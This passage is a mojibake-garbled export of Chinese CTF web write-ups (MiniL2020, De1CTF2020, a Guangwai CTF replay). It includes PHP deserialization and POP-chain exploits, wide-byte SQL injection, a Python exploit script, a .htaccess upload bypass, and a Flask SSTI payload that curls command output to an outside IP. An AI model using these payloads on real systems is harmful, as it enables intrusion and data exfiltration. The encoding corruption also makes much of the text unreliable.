1 offset 3#\u0026amp;logpass=1\rå›æ˜¾ï¼šalert('Username:Flag_1s_heRe \\nPassword:goto /flag327a6c4304a')\rè®¿é—® ip/flag327a6c4304a/ ï¼Œæ¥åˆ°ç¬¬äºŒå…³ï¼š\n\u0026lt;?php\rinclude ('flag.php');\rerror_reporting(0);\rfunction filter($payload){\r$key = array('php','flag','xdsec');\r$filter = '/'.implode('|',$key).'/i';\rreturn preg_replace($filter,'hack!!!!',$payload);\r}\r$payload=$_GET['payload'];\r$fuck['mini']='nb666';\r$fuck['V0n']='no_girlfriend';\rif(isset($payload)) {\rif (strpos($payload, 'php') \u0026gt;=0 || strpos($payload, 'flag')\u0026gt;=0 || strpos($payload, 'xdsec')\u0026gt;=0) {\r$fuck['mini']=$payload;\rvar_dump(filter(serialize($fuck)));\r$fuck=unserialize(filter(serialize($fuck)));\rvar_dump($fuck);\rif ($fuck['V0n'] === 'has_girlfriend') {\recho $flag;\r} else {\recho 'fuck_no_girlfriend!!!';\r}\r}else{\recho 'fuck_no_key!!!';\r}\r}else{\rhighlight_file(__FILE__);\r}\ré¢˜ç›®ä¼šæŠŠåºåˆ—åŒ–ä¹‹åçš„ php flag xdsec å…³é”®å­—æ›¿æ¢ä¸º hack!!!! ç„¶åè¿›è¡Œååºåˆ—åŒ–æ“ä½œå†èµ‹å€¼ç»™ $fuck æˆ‘å°±ç›´æ¥æƒ³åˆ°äº†å®‰æ’2020.4æœˆèµ›çš„web1ï¼Œè¶Šçœ‹è¶Šåƒå­—ç¬¦é€ƒé€¸ï¼Œä¸è¿‡æœ‰åŒºåˆ«çš„æ˜¯è¿™é‡Œæ˜¯å­—ç¬¦å˜å¤šå¯¼è‡´åé¢çš„é€ƒé€¸ï¼Œä¸è¿‡æ€è·¯ä¸€æ ·ï¼šé€ƒé€¸ã€é—­åˆ\næˆ‘ä»¬çš„ php å…³é”®å­—è¢«æ›¿æ¢ä¸º hack!!!! ä¹‹åï¼Œä»3ä¸ªå­—ç¬¦å˜æˆäº†5ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯ååºåˆ—åŒ–çš„æ—¶å€™ç”±äº s:3 çš„å­˜åœ¨ï¼Œè¿™ä¸ªå€¼ä»ç„¶ä¼šè¢«å½“ä½œä¸‰ä¸ªå­—ç¬¦æ¥å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹å›¾æ›¿æ¢ä¹‹åç”±äºå·¦è¾¹é€‰ä¸­éƒ¨åˆ†ä¸ä¸€è‡´ï¼Œé€ æˆäº†ååºåˆ—åŒ–åå‡ºç° bool(false) çš„ç»“æœ\nç›´æ¥çœ‹payloadå°±æ‡‚ï¼š\n?payload=phpphpphpphpphpphpphp\u0026quot;;s:3:\u0026quot;V0n\u0026quot;;s:14:\u0026quot;has_girlfriend\u0026quot;;}\ræˆ‘ä»¬è¾“å…¥äº†56äº†å­—ç¬¦ï¼Œ phpphpphpphpphpphpphp è¢«æ›¿æ¢ä¹‹åæ­£å¥½æ˜¯56ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬åé¢çš„å­—ç¬¦å°±é€ƒé€¸äº†ï¼Œè¿™ä¸ªæ—¶å€™ç»™ä»–ä¸€é—­å’Œï¼Œflagå°±æ¥äº†\nminil{7f3ea366-f5ab-463c-b511-af63d6dc7715}\nLet\u0026rsquo;s_Play_Dolls è€ƒç‚¹ï¼šPHPæ— å‚æ•°RCEã€popé“¾\nå¼€é¢˜é€ç ï¼š\n \u0026lt;?php\rerror_reporting(0);\rif(isset($_GET['a'])){\runserialize($_GET['a']);\r}\relse{\rhighlight_file(__FILE__);\r}\rclass foo1{\rpublic $var='';\rfunction __construct(){\r$this-\u0026gt;var='phpinfo();';\r}\rfunction execute(){\rif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $this-\u0026gt;var)) { if(!preg_match('/header|bin|hex|oct|dec|na|eval|exec|system|pass/i',$this-\u0026gt;var)){\reval($this-\u0026gt;var);\r} else{\rdie(\u0026quot;hacked!\u0026quot;);\r} }\r}\rfunction __wakeup(){\r$this-\u0026gt;var=\u0026quot;phpinfo();\u0026quot;;\r}\rfunction __desctuct(){\recho '\u0026lt;br\u0026gt;desctuct foo1\u0026lt;/br\u0026gt;';\r}\r}\rclass foo2{\rpublic $var;\rpublic $obj;\rfunction __construct(){\r$this-\u0026gt;var='hi';\r$this-\u0026gt;obj=null;\r}\rfunction __toString(){\r$this-\u0026gt;obj-\u0026gt;execute();\rreturn $this-\u0026gt;var;\r}\rfunction __desctuct(){\recho '\u0026lt;br\u0026gt;desctuct foo2\u0026lt;/br\u0026gt;';\r}\r}\rclass foo3{\rpublic $var;\rfunction __construct(){\r$this-\u0026gt;var=\u0026quot;index.php\u0026quot;;\r}\rfunction __destruct(){\rif(file_exists($this-\u0026gt;var)){\recho \u0026quot;\u0026lt;br\u0026gt;\u0026quot;.$this-\u0026gt;var.\u0026quot;exist\u0026lt;/br\u0026gt;\u0026quot;;\r}\recho \u0026quot;\u0026lt;br\u0026gt;desctuct foo3\u0026lt;/br\u0026gt;\u0026quot;;\r}\rfunction execute(){\rprint(\u0026quot;hi\u0026quot;);\r}\r}\rå¤§æ¦‚æ˜¯è¿™æ ·ï¼š\n$pop = new foo3;\r$pop-\u0026gt;var = new foo2;//è§¦å‘__toString()ï¼Œè°ƒç”¨execute()\r$pop-\u0026gt;var-\u0026gt;obj = new foo1;//è°ƒç”¨foo1çš„execute()\ræˆåŠŸè°ƒç”¨foo1çš„execute()å‡½æ•°ä¹‹åå°±éœ€è¦æˆ‘ä»¬ç»•æ­£åˆ™ï¼Œè¿™é‡Œæ˜¯æ— å‚æ•°RCEï¼Œ if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $this-\u0026gt;var)) é™åˆ¶äº†å‚æ•°ï¼›\næŸ¥äº†ä¸€ä¸‹?Rï¼ŒPHP manualä¸­è¿™æ ·è¯´ï¼š\n â€é¦–å…ˆï¼Œå®ƒåŒ¹é…ä¸€ä¸ªå·¦æ‹¬å·ã€‚ ç„¶åå®ƒåŒ¹é…ä»»æ„æ•°é‡çš„éæ‹¬å·å­—ç¬¦åºåˆ—æˆ–ä¸€ä¸ªæ¨¡å¼è‡ªèº«çš„é€’å½’åŒ¹é…(æ¯”å¦‚ï¼Œ ä¸€ä¸ªæ­£ç¡®çš„æ‹¬å·å­ä¸²)ï¼Œæœ€ç»ˆï¼ŒåŒ¹é…ä¸€ä¸ªå³æ‹¬å·ã€‚â€œ  å¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­ XXXX(XXXX(XXXX()))\n\\Wç­‰ä»·äº[^A-Za-z0-9_]\r+æ‹¬å·åŒ¹é…\\( ...... \\)\r+æ‹¬å·ä¸­é—´æ˜¯XXXX(XXXX(XXXX()))\ræ„æ€æ˜¯æˆ‘ä»¬å¯ä»¥ a(); a(a()); ä½†æ˜¯ä¸èƒ½ a('1'); ã€‚\néœ€è¦æˆ‘ä»¬è¿›è¡Œä¸å¸¦å‚æ•°çš„RCEï¼Œè¿™é‡Œç‹å¹ä¹‹å¸ˆå‚…è®²çš„å¾ˆå¥½ï¼ŒåŸºæœ¬å°±æ˜¯é‚£å‡ ä¸ªå‡½æ•°æ¢ç€ç”¨ï¼Œè¿™é‡Œç›´æ¥ä¸Šplayloadï¼›\næŠŠfoo1çš„varå±æ€§æ”¹ä¸ºï¼š\nprint_r(array_reverse(scandir(current(localeconv()))));\rè¿”å›å€¼ï¼š\rArray ( [0] =\u0026gt; youCanGet1tmaybe [1] =\u0026gt; index.php [2] =\u0026gt; .. [3] =\u0026gt; . )\rprint_r(scandir(next(scandir(current(localeconv())))));\rè¿”å›å€¼ï¼š\rArray ( [0] =\u0026gt; . [1] =\u0026gt; .. [2] =\u0026gt; html ) å‘ç°ä¸æ˜¯åœ¨ä¸Šçº§ç›®å½•ï¼Œåº”è¯¥æ˜¯è¯»å–youCanGet1tmaybeæ–‡ä»¶\rprint_r(readfile(end(scandir(current(localeconv())))));\rè¿”å›å€¼ï¼š\rminil{af22c569-6114-44c6-8c8c-4b561cf7ac7b}\ræ³¨æ„ï¼š echo serialize($pop)ä¹‹åï¼Œéœ€è¦ç»•è¿‡ __wakeup() æ‰è¡Œã€‚\nare you reclu3e? è€ƒç‚¹ï¼švimæ–‡ä»¶æ¢å¤ã€å®½å­—èŠ‚æ³¨å…¥ã€ååºåˆ—åŒ–\nå…¶å®å®½å­—èŠ‚ä¸€å¼€å§‹å°±æµ‹å‡ºæ¥äº†ã€‚ã€‚ã€‚ åªä¸è¿‡æˆ‘ä»¥ä¸ºæ˜¯è¦åˆ°è¡¨é‡Œé¢å»æ³¨ä»€ä¹ˆä¸œè¥¿ï¼Œç»“æœæ˜¯åªéœ€è¦ç™»é™†å°±å¯ä»¥ã€‚ã€‚ã€‚\næ ¹æ®æ”¾å‡ºçš„hintï¼Œæç¤ºvimï¼Œé©¬ä¸Šæƒ³åˆ°.swpæ–‡ä»¶ï¼Œloginå’Œindexçš„å…¨éƒ¨æ•´ä¸‹æ¥æ¢å¤\nåœ¨login.phpä¸­å‘ç°GBKå­—æ ·ï¼Œå®é”¤å®½å­—èŠ‚æ³¨å…¥ï¼š\nusername=reclu3e%df' union select 1,1#\u0026amp;password=1\rç™»å½•ä¹‹åæˆ‘ä»¬å°±æœ‰äº†sessionï¼Œå¯ä»¥GETä¼ å…¥pè®©ä»–ååºåˆ—åŒ–\næ ¹æ®ç½‘é¼çš„web1ï¼ŒPHP7.1+çš„ç‰ˆæœ¬ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¸ä¼šå¯¹å±æ€§ç±»å‹è¿›â¾ç‰¹åˆ«çš„å¤„ç†\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠä»–æ”¹æˆpublicæ¥æ‰“ï¼š\n\u0026lt;?php\rinclude \u0026quot;flag.php\u0026quot;;//$flag=\u0026quot;minilctf{****}\u0026quot;;\rsession_start();\rif (empty($_SESSION['uid'])) {\rinclude \u0026quot;loginForm.html\u0026quot;;\r}\relse{\recho '\u0026lt;h1\u0026gt;Hello, reclu3e!\u0026lt;/h1\u0026gt;';\r$p=unserialize(isset($_GET[\u0026quot;p\u0026quot;])?$_GET[\u0026quot;p\u0026quot;]:\u0026quot;\u0026quot;);\r}\r?\u0026gt;\r\u0026lt;?php\rclass person{\rpublic $name='';\rpublic $age=0;\rpublic $weight=0;\rpublic $height=0;\rpublic $serialize='\u0026quot;;phpinfo();$s=\u0026quot;';\rpublic function __wakeup(){\rif(is_numeric($this-\u0026gt;serialize)){\r$this-\u0026gt;serialize++;\r}\r}\rpublic function __destruct(){\r@eval('$s=\u0026quot;'.$this-\u0026gt;serialize.'\u0026quot;;');\r}\r}\r$p = new person();\recho serialize($p);\r//O:6:\u0026quot;person\u0026quot;:5:{s:4:\u0026quot;name\u0026quot;;s:0:\u0026quot;\u0026quot;;s:3:\u0026quot;age\u0026quot;;i:0;s:6:\u0026quot;weight\u0026quot;;\ri:0;s:6:\u0026quot;height\u0026quot;;i:0;s:9:\u0026quot;serialize\u0026quot;;s:16:\u0026quot;\u0026quot;;phpinfo();$s=\u0026quot;\u0026quot;;}\rflagå°±åœ¨PHPINFOé‡Œé¢\nå…¶å®è¿™æ˜¯ä¸€é“ç®€å•é¢˜ï¼Œä¹‹å‰æˆ‘å°±æµ‹å‡ºæ¥å®½å­—èŠ‚ï¼Œä¸è¿‡åº”è¯¥æ˜¯information_schemaé‡Œé¢çš„åˆ—åè¢«åˆ äº†ï¼Œ æˆ‘ä»¥ä¸ºæ˜¯è¦æ³¨å¯†ç æ¥ç™»å½•ï¼Œç»“æœæ²¡æƒ³åˆ°ã€‚ã€‚ç„¶åååºåˆ—åŒ–ä¹Ÿç®€å•ï¼Œè‡³äºåæ¥ç»™äº†hintä¹‹åè§£å‡ºä»ç„¶è¿™ ä¹ˆå°‘ï¼Œå¯èƒ½å°±æ˜¯æœ¬é¢˜çš„æ§½ç‚¹ä¹‹ä¸€ã€‚\nminil{22dac17a-b2e6-41c7-b969-5b1687fc73e1}\np è€ƒç‚¹ï¼šååºåˆ—åŒ–ã€RCEç»•è¿‡\nå¬è¯´å’ŒCTFshowçš„çº¢åŒ…é¢˜ç¬¬äºŒå¼¹å‡ ä¹å·®ä¸å¤šï¼Œå½“æ—¶æ²¡åšï¼Œä¸è¿‡æˆ‘çœ‹äº†wpä¹‹åå‘ç°æˆ‘çš„æ“ä½œå‡ ä¹ ä¸€æ¯›ä¸€æ ·ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæ²¡å‡ºã€‚æ—¥åæ¥å¡«å‘\nmdï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œä¹‹å‰æˆ‘è‡ªå·±æ„é€ äº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ è¡¨å•ï¼Œç„¶åç”¨bpçš„intruderå‘åŒ…ï¼Œè´¹åŠ›ä¸è®¨å¥½ï¼Œæ­»æ´»å¼„ä¸å‡ºæ¥ã€‚\nåæ¥çœ‹äº†@blackwatchå¸ˆå‚…çš„wpä¹‹åï¼Œç›´æ¥èµ·ä¸€ä¸ªå‡ è¡Œä»£ç çš„pythonå°±å¯ä»¥çš„ã€‚ã€‚ã€‚ã€‚\nè¢«è‡ªå·±èœå“­ï¼Œä¸å¤šBBï¼Œexpï¼š\nimport requests\rimport base64\rurl = 'http://2c0b5cfcdee39a9fb6e7f5789943ca90.challenge.mini.lctf.online:1080/'\rgit = 'O:6:\u0026quot;github\u0026quot;:2:{s:3:\u0026quot;cmd\u0026quot;;s:26:\u0026quot;?\u0026gt;\u0026lt;?=`. /??p/p?p??????`;?\u0026gt;\u0026quot;;}'\rgit = base64.b64encode(git.encode()).decode()\rcookies = {'git': git}\rfiles = {'file': '#!/bin/sh\\ncat /* | grep \u0026quot;minil\u0026quot;\\n'}\ra = requests.post(url, files=files, cookies=cookies)\rprint(a.text)\rminil{7da6b052-6630-40d8-9e7a-ccd5ff098871}\ninclude è€ƒç‚¹ï¼šPHPè¯­è¨€é€»è¾‘ã€WebDavåè®®ç»•è¿‡RFIé™åˆ¶\nä¸æƒ³åšã€‚ã€‚æ—¥åå¡«å‘\n","date":"2020-05-10T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170521.png","permalink":"https://anthem-whisper.github.io/p/minil2020_web_wp/","title":"MiniL2020_web_wp"},{"content":"æœ¬æ¬¡De1CTFæ˜¯XCTFçš„ç¬¬ä¸€åœºåˆ†ç«™èµ›ï¼Œä¸ä½†å¸å¼•äº†å›½å†…è®¸è®¸å¤šå¤šçš„æˆ˜é˜Ÿï¼Œè¿˜æœ‰éå¸¸å¤šçš„å›½å¤–çš„æˆ˜é˜Ÿï¼Œæ®è¯´å‰26åä¸€åŠéƒ½æ˜¯å›½å¤–çš„ã€‚å½“ç„¶æ¯”èµ›é¢˜ç›®ä¹Ÿæ˜¯éå¸¸çš„éš¾ï¼Œæ„Ÿè§‰è‡ªå·±åœ¨è¿™ç§å¤§æ¯”èµ›ä¸Šé¢è¿˜æ˜¯ä¸èƒ½å‘æŒ¥ä»€ä¹ˆä½œç”¨ã€‚\n check in æ‰“å¼€å°±æ˜¯ä¸€ä¸ªç»å…¸çš„æ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œä¸Šä¼ ä¸€ä¸ªæ™®é€šçš„å›¾ç‰‡é©¬ï¼Œé¡µé¢å›æ˜¾ï¼š\nperl|pyth|ph|auto|curl|base|\u0026gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents!\ræ–‡ä»¶å†…å®¹è¢«banäº†è¿™äº›ï¼Œ\néšåå°è¯•äº†ä¸€äº›æ–‡ä»¶åç§°ï¼Œåªè¦æ–‡ä»¶åå¸¦phã€htmlã€.user.iniä¹‹ç±»çš„éƒ½ä¼šç›´æ¥è¿”å›filename error\nä¸è¿‡è¿™ä¹ˆå¤šä¸œè¥¿éƒ½è¢«banäº†ï¼Œå”¯ç‹¬ .htaccess æ²¡æœ‰è¢«banã€‚\nä¸è¿‡è¿™ä¸ªæˆ‘å¼€å±€å°±å°è¯•äº†ï¼Œä½†æ˜¯æ²¡æœ‰å‘ç°ä»€ä¹ˆå§¿åŠ¿ã€‚\nå…³äº .htaccess å‡ ç§å§¿åŠ¿ï¼š  å°†ç‰¹å®šæ–‡ä»¶ä½œä¸ºphpè§£æï¼Œç”¨ä½œåé—¨ã€‚ PHPç¯å¢ƒä¸‹ä½¿ç”¨ auto_prepend_file æˆ– auto_append_file åˆ›å»ºåé—¨ï¼ˆå¯¹äºCGI/FastCGIæ¨¡å¼ PHP 5.3.0 ä»¥ä¸Šç‰ˆæœ¬ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ åœ¨ç›®å½•ä¸‹åˆ›å»º.user.iniæ–‡ä»¶ ã€‚æ¥å¼•å…¥è¯¥å‚æ•°ï¼‰ CGIå¯åŠ¨æ–¹å¼çš„RCEåˆ©ç”¨å§¿åŠ¿ FastCGIå¯åŠ¨æ–¹å¼çš„RCEåˆ©ç”¨å§¿åŠ¿ é‡å®šå‘  è¿™é“é¢˜banæ‰äº†phå…³é”®å­—ä¹‹åï¼Œï¼ˆ1ï¼‰ä¸­çš„æ–¹æ³•çœ‹ä¼¼ä¸å¯ä»¥ç”¨ï¼Œå®åˆ™å¦æœ‰ç„æœºã€‚\nåœ¨XNUCA2019ä¸­ï¼Œä¸€é“webé¢˜ç›®ezphpçš„éé¢„æœŸè§£ä¸­ï¼Œåˆ©ç”¨åˆ°äº† \\ æ‹¼æ¥ .htaccess æ–‡ä»¶ä¸­æ¢è¡Œçš„å†…å®¹ï¼Œå½“æ—¶ä¸€ç§æ˜¯ä¸ºäº†åˆ©ç”¨ç¬¬ä¸€è¡Œçš„ # ç¬¦å·æ‹¼æ¥ç¬¬äºŒè¡Œçš„åƒåœ¾æ•°æ®æ¥è¾¾åˆ°æ³¨é‡Šåƒåœ¾æ•°æ®çš„ç›®çš„ï¼Œå¦ä¸€ç§ä¹Ÿæ˜¯ \\ æ‹¼æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚å…·ä½“å¯ä»¥å‚çœ‹XNUCA2019 ezç³»åˆ—webé¢˜è§£å’ŒX-NUCA 2019 Web WP\næ–‡ä»¶å .htaccessï¼ŒMIMEæ”¹æˆ image/jpg ï¼Œæ–‡ä»¶å†…å®¹ï¼š\nAddType application/x-httpd-p\\\rhp .jpg\ré‚£ä¹ˆæˆ‘ä»¬é€šè¿‡\\æ¥æ‹¼æ¥ç»•è¿‡äº†phå…³é”®å­—ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°æˆ‘ä»¬ä¸Šä¼ çš„jpgæ–‡ä»¶ä¸å†æ˜¯æ— æ³•æŸ¥çœ‹çš„æƒ…å†µï¼š\nç¬¬äºŒä¸ªç‚¹ï¼ŒPHPechoçŸ­æ ‡ç­¾ã€‚\nè¿‡æ»¤äº† \u0026gt; å’Œ ph çš„æƒ…å†µä¸‹ï¼Œ \u0026lt;?php ?\u0026gt; å’Œ \u0026lt;script\u0026gt; è¿™ç§è¢«é€šæ€äº†ï¼Œå‚è€ƒç½‘ä¸Šçš„ä¸€ç¯‡æ–‡ç« ï¼š\nPHP çš„å››ç§æ ‡ç­¾å†™æ³• \u0026lt;?php echo 1; ?\u0026gt; //æ­£å¸¸å†™æ³•\r\u0026lt;? echo 1; ?\u0026gt; //çŸ­æ ‡ç­¾å†™æ³•ï¼Œ5.4 èµ· \u0026lt;?= 'hello'; === \u0026lt;? echo 'hello';\r\u0026lt;% echo 1; %\u0026gt; //asp é£æ ¼å†™æ³•\r\u0026lt;script language=\u0026quot;php\u0026quot;\u0026gt; echo 1; \u0026lt;/script\u0026gt; //é•¿æ ‡ç­¾å†™æ³•\rä¸åŒç‰ˆæœ¬çš„åŒºåˆ«\nç¬¬ 1 ç§æ˜¯æ­£å¸¸å†™æ³•ï¼Œæ²¡ä»€ä¹ˆå¯è¯´çš„ã€‚\nç¬¬ 2 ç§ï¼Œéœ€è¦ php.ini é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ short_open_tag æ‰“å¼€åæ‰å¯ç”¨ï¼Œæˆ–è€…åœ¨ PHP ç¼–è¯‘æ—¶åŠ å…¥äº† --enable-short-tags é€‰é¡¹ã€‚è‡ª PHP5.4 èµ·ï¼ŒçŸ­æ ¼å¼çš„ echo æ ‡è®° \u0026lt;?= æ€»ä¼šè¢«è¯†åˆ«å¹¶ä¸”åˆæ³•ï¼Œè€Œä¸ç®¡ short_open_tag çš„è®¾ç½®æ˜¯ä»€ä¹ˆã€‚\nç¬¬ 3 ç§ï¼Œä¸æ¨èå†™æ³•ï¼Œä¸ºäº† asp ç¨‹åºå‘˜å­¦ä¹  php æ‰€æ·»åŠ çš„è¯­æ³•ç³–å†™æ³•ã€‚éœ€è¦é€šè¿‡ php.ini é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤ asp_tags æ‰“å¼€åæ‰å¯ç”¨ã€‚\nç¬¬ 4 ç§ï¼Œåœ¨ php7.0 åå·²ç»ä¸è§£æäº†ã€‚\né‚£å°±ç›´æ¥ojbkï¼š\nDe1ctf{cG1_cG1_cg1_857_857_cgll111ll11lll}\n","date":"2020-05-04T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170416.png","permalink":"https://anthem-whisper.github.io/p/de1ctf2020_check-in/","title":"De1CTF2020_check in"},{"content":"ä¹‹å‰å¹¿å¤–CTFçš„æ—¶å€™æ‰åˆšåˆšæ¥è§¦CTFï¼Œå½“æ—¶åªåšäº†ä¸€é“éšæœºæ•°çˆ†ç ´ï¼Œç°åœ¨æ¥å¤ç°\n ä½ çš„åå­— è€ƒç‚¹ï¼šflaskSSTIã€ç»•è¿‡{{}}è¿‡æ»¤ã€é»‘åå•è¿‡æ»¤é€»è¾‘é”™è¯¯\nå¾ˆè¯¦ç»†çš„SSTI\u0026raquo;ï¼šhttps://xz.aliyun.com/t/6885#toc-4\nSSTIbypasså§¿åŠ¿\u0026raquo;https://p0sec.net/index.php/archives/120/\nå‚è€ƒï¼š\u0026raquo;ggb0n\næ‰“å¼€é¢˜ç›®ï¼Œåªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œè”æƒ³åˆ°æ³¨å…¥ï¼Œä¸è¿‡SQLiå°è¯•ä¹‹åå‘ç°å¹¶ä¸è¡Œï¼Œäºæ˜¯å°±å»å°è¯•SSTIï¼Œä¸è¿‡ç½‘ä¸Šçš„wpè¯´å¯ä»¥é€šè¿‡æŠ“åŒ…æŸ¥çœ‹å“åº”å¤´æ¥åˆ¤æ–­æœåŠ¡å™¨ä½¿ç”¨çš„pythonçš„æ¨¡æ¿ã€‚\nå°è¯•è¾“å…¥{{2*2}}ï¼Œè¿”å›â€œParse error: syntax error, unexpected T_STRING, expecting \u0026lsquo;{\u0026rsquo; in \\var\\WWW\\html\\test.php on line 13 â€\nä¸ç®¡æ€ä¹ˆæ”¹ï¼Œè¿”å›çš„ç»“æœéƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¯´æ˜å¯èƒ½{{}}è¢«è¿‡æ»¤äº†ï¼›\nä½†æ˜¯å¯ä»¥é€šè¿‡ {%%} ç±»ä¼¼çš„æ–¹å¼æ¥è¿›è¡Œæ³¨å…¥ï¼Œå°è¯• {%if 1%}1{% endif%} ï¼Œå‘ç°æœåŠ¡å™¨ç›´æ¥ç»™å‡º500é”™è¯¯ã€‚ã€‚ã€‚åˆ¤æ–­å¯èƒ½æœ‰ä»€ä¹ˆè¿‡æ»¤\nç›´æ¥è¾“å…¥ifï¼Œè¿”å›ç»“æœæ˜¯ï¼š\nhello !\rè¯´æ˜ifè¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå°è¯•åŒå†™iiffï¼Œä½†æ˜¯è¿˜æ˜¯è¢«æ›¿æ¢ä¸ºç©ºäº†ï¼Œå¯èƒ½æ˜¯ç”¨çš„å¾ªç¯åŒ¹é…ã€‚\nå‚è€ƒäº†å¸ˆå‚…å†™çš„wpï¼Œfuzzå‡ºæ¥çš„è¿‡æ»¤å¯èƒ½æ˜¯è¿™ä¸ªæ ·å­ï¼š\nblacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval',\r'if', 'for',' subprocess', 'file', 'open', 'popen', 'builtins', 'compile',\r'execfile', 'from_pyfile', 'local','self', 'item', 'getitem', 'getattribute', 'func_globals', 'config']\rfor no in blacklist:\rwhile True:\rif no in s:\rs = s.replace(no, '')\relse:\rbreak\rreturn s\rè€ƒå¯Ÿé»‘åå•è¿‡æ»¤é€»è¾‘é”™è¯¯ï¼Œè¿™ç§è¿‡æ»¤ï¼Œåˆ©ç”¨é»‘åå•ä¸­æœ€åä¸€ä¸ªè¯è¿›è¡Œæ··æ·†æ¥è¿‡æ»¤æ˜¯æœ€å¥½äº†ï¼Œå³ if=\u0026gt;iconfigf ï¼Œå› ä¸ºæ˜¯ç”¨é»‘åå•çš„å…³é”®è¯æŒ‰é¡ºåºæ¥å¯¹è¾“å…¥è¿›è¡Œæ›¿æ¢çš„ï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ª config è¢«æ›¿æ¢ä¹‹åï¼Œè¿‡æ»¤ä¹Ÿå°±ç»“æŸäº†ã€‚\né‚£ä¹ˆæˆ‘ä»¬åœ¨æ‰€æœ‰è¢«è¿‡æ»¤çš„å…³é”®è¯ä¸­é—´éƒ½å¯ä»¥æ’å…¥ä¸€ä¸ªconfigæ¥é¿å¼€è¿‡æ»¤ï¼›\næœ€ç»ˆplaylaodï¼š\n{% iconfigf ''.__clconfigass__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.__globals__['linecache'].oconfigs.system('curl http://174.0.225.32/?a=`ls \\|base64`') %}1{% endiconfigf %}\r#ç›¸å½“äºæŠŠlsçš„ç»“æœè¿›è¡Œbase64ç¼–ç åï¼ˆä¸ç„¶åªèƒ½æ˜¾ç¤ºä¸€è¡Œï¼‰ï¼Œä»¥curlçš„æ–¹å¼å‘é€åˆ°æ”»å‡»æœº\rflag{a2bc941d-a38d-42bb-97be-fe2440442cdf}\næ¯ç‡¥çš„æŠ½å¥– è€ƒç‚¹ï¼šPHPé€†å‘è„šæœ¬ã€PHPä¼ªéšæœºæ•°çˆ†ç ´\næ‰“å¼€é¢˜ç›®ï¼Œå«ä½ çŒœæ•°æ®ï¼Œå¹¶ä¸”ç»™äº†å‰10ä½ï¼š\néšä¾¿è¾“ä¸€ä¸ªæäº¤ï¼Œéšå³ç»™å‡ºæºç ï¼š\n\u0026lt;?php\r#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼\rheader(\u0026quot;Content-Type: text/html;charset=utf-8\u0026quot;);\rsession_start();\rif(!isset($_SESSION['seed'])){\r$_SESSION['seed']=rand(0,999999999);\r}\rmt_srand($_SESSION['seed']);\r$str_long1 = \u0026quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026quot;;\r$str='';\r$len1=20;\rfor ( $i = 0; $i \u0026lt; $len1; $i++ ){\r$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); }\r$str_show = substr($str, 0, 10);\recho \u0026quot;\u0026lt;p id='p1'\u0026gt;\u0026quot;.$str_show.\u0026quot;\u0026lt;/p\u0026gt;\u0026quot;;\rif(isset($_POST['num'])){\rif($_POST['num']===$str){x\recho \u0026quot;\u0026lt;p id=flag\u0026gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}\u0026lt;/p\u0026gt;\u0026quot;;\r}\relse{\recho \u0026quot;\u0026lt;p id=flag\u0026gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§\u0026lt;/p\u0026gt;\u0026quot;;\r}\r}\rshow_source(\u0026quot;check.php\u0026quot;);\ræ„æ€å¤§æ¦‚æ˜¯ï¼š\nä¸€ä¸ª20æ¬¡çš„å¾ªç¯ï¼Œæ¯æ¬¡ä» $str_long1 éšæœºå–ä¸€ä¸ªå­—ç¬¦ï¼Œæ‹¼æ¥æˆæœ€åçš„ $str ã€‚\n å½“ mt_rand() å‡½æ•°è¿è¡Œçš„æ—¶å€™ï¼Œä¼šæ£€æŸ¥æœ‰æ²¡æœ‰æ’­ç§ mt_srand å¦‚æœå·²ç»æ’­ç§äº†ï¼Œå°±ç›´æ¥å–éšæœºæ•°ï¼Œå…¶å®è¿™é‡Œå’ŒCè¯­è¨€ä¸€æ ·ï¼ˆPHPåº•å±‚æ˜¯Cï¼‰å¦‚æœä¸æ¯æ¬¡é‡æ–°æ’­ç§çš„è¯ï¼Œéšæœºæ•°æ€ä¹ˆå–éƒ½æ˜¯ä¸€æ ·çš„  æˆ‘ä»¬æ¥å†™æ®µä»£ç ã€‚\n\u0026lt;?php\rmt_srand(12345);\recho mt_rand().\u0026quot;\u0026lt;br/\u0026gt;\u0026quot;;\r?\u0026gt;\ræˆ‘ä»¬è®¿é—®ï¼Œè¾“å‡º 162946439 ã€‚\nç°åœ¨ä»£ç æ”¹ä¸º\n\u0026lt;?php mt_srand(12345); echo mt_rand().\u0026quot;\u0026lt;br/\u0026gt;\u0026quot;;\recho mt_rand().\u0026quot;\u0026lt;br/\u0026gt;\u0026quot;;\recho mt_rand().\u0026quot;\u0026lt;br/\u0026gt;\u0026quot;;\recho 